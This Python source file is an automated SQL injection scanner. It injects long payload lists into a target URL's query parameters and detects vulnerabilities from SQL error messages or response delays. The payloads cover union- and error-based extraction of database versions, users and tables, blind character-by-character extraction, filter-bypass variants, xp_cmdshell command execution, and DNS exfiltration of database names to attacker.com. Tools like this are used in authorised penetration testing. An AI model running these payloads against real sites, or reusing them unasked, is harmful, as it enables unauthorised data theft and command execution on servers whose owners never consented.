import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from colorama import Fore
import time

#Common SQLi payloads => basic, error-based, time-based

SQLI_PAYLOADS = [
    # Basic single/double quote and comment combinations
    "'",
    "\"",
    "'--",
    "\"--",
    "'#",  # MySQL line comment
    "\"#", # MySQL line comment

    # Basic boolean-based injection (always true conditions)
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    " or 1=1--",
    " or 1=1 #",

    # Error-based injection (for extracting information via error messages)
    # MySQL/MariaDB
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7c,(SELECT VERSION()),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7c,(SELECT database()),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7c,(SELECT user()),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    # SQL Server (e.g., using XML)
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
    "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--",
    # PostgreSQL
    "' AND 1=CAST(pg_version() AS int)--", # will cause error
    "' AND 1=CAST(current_database() AS int)--", # will cause error

    # Union-based injection (for combining results from other queries)
    " ORDER BY 1--", # Find number of columns
    " ORDER BY 9999--", # Find number of columns (will error if too high)
    " UNION SELECT NULL--",
    " UNION SELECT NULL,NULL--",
    " UNION SELECT 1,2,3,4,5--", # Adjust number of NULLs/numbers based on column count
    " UNION SELECT @@version,NULL,NULL--", # Example with version info (MySQL/SQL Server)
    " UNION SELECT version(),NULL,NULL--", # Example with version info (PostgreSQL)
    " UNION SELECT user(),database(),NULL--", # Example with user/db info (MySQL)
    " UNION SELECT user,NULL,NULL FROM mysql.user--", # Example for MySQL user enumeration
    " UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema = database()--", # MySQL/PostgreSQL table enumeration
    " UNION SELECT name,NULL,NULL FROM sys.tables--", # SQL Server table enumeration

    # Boolean-based blind injection (true/false conditions to infer data)
    " AND (SELECT LENGTH(database()) > 5)--", # MySQL/PostgreSQL
    " AND (SELECT LEN(DB_NAME()) > 5)--", # SQL Server
    " AND SUBSTRING((SELECT database()),1,1) = 'a'--", # MySQL/PostgreSQL character by character
    " AND SUBSTRING((SELECT DB_NAME()),1,1) = 'a'--", # SQL Server character by character

    # Out-of-band (OOB) injection (e.g., DNS exfiltration)
    # MySQL/MariaDB (requires out_file_priv or into_outfile)
    " INTO OUTFILE '/tmp/test.txt' SELECT database()--", # Not always applicable via HTTP response
    # SQL Server (requires xp_dirtree, xp_cmdshell, or SQLXML)
    "' AND 1=(SELECT master.dbo.xp_cmdshell('ping -n 1 ' + DB_NAME() + '.attacker.com'))--", # If xp_cmdshell is enabled
    "' AND 1=(SELECT @@version FROM OPENROWSET('SQLNCLI', 'server=(local);database=master;trusted_connection=yes', 'select 1'))--", # Example via linked server

    # Bypass techniques (e.g., for WAFs or specific filters)
    "/**/OR/**/1=1--", # Obfuscated space
    "%20OR%201=1--", # URL encoded space
    "/**/UNION/**/SELECT/**/1,2,3--",
    "' OR '1'='1' ANd '1'='1", # Additional AND condition
    "' or '1'='1'/*", # Multiline comment
    "'; EXEC xp_cmdshell('whoami');--", # SQL Server command execution (if enabled)
    "'; SELECT SLEEP(5);--", # MySQL alternate delay
    "'; SELECT pg_sleep(5);--", # PostgreSQL alternate delay
    "'; select 'a' where 1=1 and 1=utl_inaddr.get_host_address((select user from dual)||'.attacker.com');--", # Oracle DNS exfil
    "'+(SELECT 'a' FROM DUAL WHERE 1=1)--", # Oracle inline comment for string concatenation
    "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", # MySQL comment-based bypass
]

TIME_BASED_PAYLOADS = [
    # SQL Server
    "'; WAITFOR DELAY '0:0:5' --",
    "'; IF (SELECT @@version) LIKE '%Microsoft SQL Server%' WAITFOR DELAY '0:0:5' --",
    "'; IF (SELECT COUNT(*) FROM users WHERE username = 'admin' AND password LIKE 'a%') > 0 WAITFOR DELAY '0:0:5' --",
    "'; DECLARE @x INT; SET @x = 0; WHILE (@x < 1000000) BEGIN SET @x = @x + 1; END; --", # CPU-intensive delay

    # MySQL/MariaDB
    "'; SELECT SLEEP(5); --",
    "'; IF(ASCII(SUBSTRING((SELECT database()),1,1))=100,SLEEP(5),0)--", # Conditional sleep based on character
    "'; BENCHMARK(10000000,MD5('test')) --", # CPU-intensive delay
    "') OR SLEEP(5) AND ('1'='1", # Injected into a string context

    # PostgreSQL
    "'; SELECT pg_sleep(5); --",
    "'; SELECT CASE WHEN (SELECT current_database()) = 'public' THEN pg_sleep(5) ELSE pg_sleep(0) END; --",
    "'; SELECT pg_sleep(LENGTH(current_database())-5); --", # Variable sleep based on data length

    # Oracle
    "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL --",
    "'; SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL; EXEC DBMS_LOCK.SLEEP(5); --", # Combines DNS lookup with sleep
    "'; BEGIN DBMS_LOCK.SLEEP(5); END; --", # PL/SQL block sleep
    "'; SELECT COUNT(*) FROM ALL_OBJECTS A, ALL_OBJECTS B, ALL_OBJECTS C WHERE DBMS_LOCK.SLEEP(0.01) IS NOT NULL AND ROWNUM <= 100000; --", # CPU-intensive loop
]

TIME_DELAY_THRESHOLD = 4 #seconds

def is_vulnerable(response_text):
    """Checking for common SQL errors in the reponse body."""

    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "ORA-00933", "ORA-00921", "Microsoft OLE DB Provider for SQL Server",
        "Syntax Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '...' at line X",
        "Syntax Error: ERROR: syntax error at or near \"...\"",
        "Syntax Error: ORA-00900: invalid SQL statement",

        "Invalid Object Name: Invalid object name 'TableName'.",
        "Invalid Object Name: ERROR: relation \"tablename\" does not exist",
        "Invalid Object Name: Table 'database.tablename' doesn't exist",
        "Invalid Object Name: ORA-00942: table or view does not exist",

        "Invalid Column Name: Invalid column name 'ColumnName'.",
        "Invalid Column Name: ERROR: column \"columnname\" does not exist",
        "Invalid Column Name: Unknown column 'columnname' in 'field list'",
        "Invalid Column Name: ORA-00904: \"COLUMN_NAME\": invalid identifier",

        "Constraint Violation: Duplicate entry 'value' for key 'PRIMARY'",
        "Constraint Violation: ERROR: duplicate key value violates unique constraint \"constraint_name\"",
        "Constraint Violation: ORA-00001: unique constraint (SCHEMA.CONSTRAINT_NAME) violated",
        "Constraint Violation: Cannot insert NULL into (column_name)",
        "Constraint Violation: Column 'columnname' cannot be null",
        "Constraint Violation: ORA-01400: cannot insert NULL into (\"SCHEMA\".\"TABLE_NAME\".\"COLUMN_NAME\")",
        "Constraint Violation: Cannot delete or update a parent row: a foreign key constraint fails",
        "Constraint Violation: ERROR: update or delete on table \"parent_table\" violates foreign key constraint \"fk_name\" on table \"child_table\"",
        "Constraint Violation: ORA-02292: integrity constraint (SCHEMA.CONSTRAINT_NAME) violated - child record found",

        "Data Type Mismatch: Data type mismatch in expression.",
        "Data Type Mismatch: ERROR: invalid input syntax for type integer: \"text\"",
        "Data Type Mismatch: Incorrect integer value: 'value' for column 'column_name'",
        "Data Type Mismatch: ORA-01722: invalid number",

        "Ambiguous Column: Column 'columnname' is ambiguous.",
        "Ambiguous Column: ERROR: column reference \"columnname\" is ambiguous",

        "Aggregation Error: Column 'columnname' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.",
        "Aggregation Error: ERROR: column \"columnname\" must appear in the GROUP BY clause or be used in an aggregate function",

        "Permission Denied: Access denied for user 'user'@'host' to database 'database_name'",
        "Permission Denied: The SELECT permission was denied on the object 'object_name', database 'database_name', schema 'schema_name'.",
        "Permission Denied: ORA-01031: insufficient privileges",

        "Connection Error: Can't connect to MySQL server on 'hostname' (errno: 111 Connection refused)",
        "Connection Error: ERROR: could not connect to server: Connection refused",
        "Connection Error: TNS:listener does not currently know of service requested in connect descriptor",
        "Connection Error: SQLSTATE[HY000]: General error: 2002 Connection refused",

        "Value Too Large: Data too long for column 'columnname' at row X",
        "Value Too Large: ORA-12899: value too large for column \"SCHEMA\".\"TABLE_NAME\".\"COLUMN_NAME\" (actual: X, maximum: Y)",

        "No Data Found: No data found for the given criteria.",
        "No Data Found: ORA-01403: no data found",

        "Divide by Zero: Divide by zero error encountered.",
        "Divide by Zero: ERROR: division by zero",

        "Deadlock/Timeout: Deadlock found when trying to get lock; try restarting transaction",
        "Deadlock/Timeout: Transaction (Process ID X) was deadlocked on lock resources with another process and has been chosen as the deadlock victim. Rerun the transaction.",
        "Deadlock/Timeout: ORA-00060: deadlock detected while waiting for resource"
    ]
    return any(error.lower() in response_text.lower() for error in errors)


def scan(url, timeout=10):
    print(Fore.CYAN + "[*] Scanning for SQL Injection Vulnerabilities...")

    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    findings = []

    if not query:
        print(Fore.YELLOW + "[!] No parameters found in the URL to test for SQLi.")
        return findings

    for param in query:
        original_value = query[param][0]
        print(Fore.YELLOW + f"[*] Testing parameter: {param}")

        # --- Error-Based, Union-Based, Boolean-Based SQLi ---
        for payload in SQLI_PAYLOADS:
            test_query = query.copy()
            test_query[param] = original_value + payload
            test_url = parsed._replace(query=urlencode(test_query, doseq=True)).geturl()

            try:
                response = requests.get(test_url, timeout=timeout)

                if is_vulnerable(response.text):
                    print(Fore.RED + f"[!] Potential SQL Injection Detected in '{param}' using payload: {payload}")
                    print(Fore.RED + f"    -> {test_url}")

                    findings.append({
                        "parameter": param,
                        "type": "Error-Based / Boolean-Based / Union SQLi",
                        "payload": payload,
                        "url": test_url
                    })
                    break  # Optional: stop after first confirmed finding for this param

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Request Error: {e}")

        # --- Time-Based Blind SQLi ---
        for time_payload in TIME_BASED_PAYLOADS:
            test_query = query.copy()
            test_query[param] = original_value + time_payload
            test_url = parsed._replace(query=urlencode(test_query, doseq=True)).geturl()

            try:
                start = time.time()
                requests.get(test_url, timeout=15)
                delay = time.time() - start

                if delay >= TIME_DELAY_THRESHOLD:
                    print(Fore.RED + f"[!] Potential Time-Based Blind SQLi in '{param}' (Delay: {round(delay, 2)}s)")
                    print(Fore.RED + f"    -> {test_url}")

                    findings.append({
                        "parameter": param,
                        "type": "Time-Based Blind SQLi",
                        "payload": time_payload,
                        "url": test_url,
                        "delay": round(delay, 2)
                    })
                    break  # Optional: stop after one delay-based match

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Time-based request error: {e}")

    return findings